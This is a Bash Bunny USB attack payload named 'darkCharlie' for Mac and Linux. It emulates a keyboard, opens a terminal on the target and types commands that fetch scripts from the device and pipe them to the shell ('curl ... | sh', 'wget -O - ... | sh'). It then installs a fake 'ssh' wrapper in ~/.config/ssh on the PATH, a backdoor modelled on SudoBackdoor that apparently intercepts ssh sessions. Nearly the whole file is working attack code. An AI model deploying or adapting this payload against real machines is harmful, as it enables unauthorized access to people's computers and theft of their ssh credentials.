/bin/bash

# Title:     darkCharlie
# Author:    Michael Weinstein
# Target:    Mac/Linux
# Version:   0.1
#
# Create a wrapper for ssh sessions that
# will live inside ~/.config/ssh and be added
# tn the $PATH.
#
# This payload was inspired greatly by SudoBackdoor
# and much of the code here was derived (or copied
# wholesale) from that with great thanks to oXis.
#
# White            |  Ready
# Amber blinking   |  Waiting for server
# Blue blinking    |  Attacking
# Green            |  Finished

LED SETUP

#setup the attack on macos (if false, attack is for Linux)
mac=false

if [ "$mac" = true ]
then
    ATTACKMODE ECM_ETHERNET HID VID_0X05AC PID_0X021E
else
    ATTACKMODE ECM_ETHERNET HID
fi

DUCKY_LANG us

GET SWITCH_POSITION
GET HOST_IP

cd /root/udisk/payloads/$SWITCH_POSITION/

# starting server
LED SPECIAL

iptables -A OUTPUT -p udp --dport 53 -j DROP
python -m SimpleHTTPServer 80 &

# wait until port is listening (credit audibleblink)
while ! nc -z localhost 80; do sleep 0.2; done
# that was brilliant!

LED ATTACK

if [ "$mac" = true ]
then
    RUN OSX terminal
else
    RUN UNITY xterm
fi
QUACK DELAY 2000

if [ "$mac" = true ]
then
    QUACK STRING curl "http://$HOST_IP/pre.sh" \| sh
    QUACK ENTER
    QUACK DELAY 200
    QUACK STRING curl "http://$HOST_IP/darkCharlie.py" \> "~/.config/ssh/ssh"
    QUACK ENTER
    QUACK DELAY 200
    QUACK STRING curl "http://$HOST_IP/post.sh" \| sh
    QUACK ENTER
    QUACK DELAY 200
    QUACK STRING python "~/.config/ssh/ssh" --initializeScript
    QUACK ENTER
    QUACK DELAY 200
else
    QUACK STRING wget -O - "http://$HOST_IP/pre.sh" \| sh  #I think wget defaults to outputting to a file and needs explicit instructions to output to STDOUT 
    QUACK DELAY 200
    QUACK ENTER
    QUACK STRING wget -O - "http://$HOST_IP/darkCharlie.py" \> "~/.config/ssh/ssh"  #Will test this on a mac when I finish up
    QUACK DELAY 200
    QUACK ENTER
    QUACK STRING wget -O - "http://$HOST_IP/post.sh" \| sh
    QUACK DELAY 200
    QUACK ENTER
    QUACK STRING python "~/.config/ssh/ssh" --initializeScript
    QUACK DELAY 200
    QUACK ENTER
fi

QUACK DELAY 200
QUACK ENTER
QUACK DELAY 200
if [ "$mac" = true ]
then
    QUACK DELAY 5000 #seems like macs need some extra time on this
    QUACK GUI w
else
    QUACK STRING exit
    QUACK DELAY 200
    QUACK ENTER
fi
LED SUCCESS  #The Dungeons and Dragons tattoo hath rolled a 20
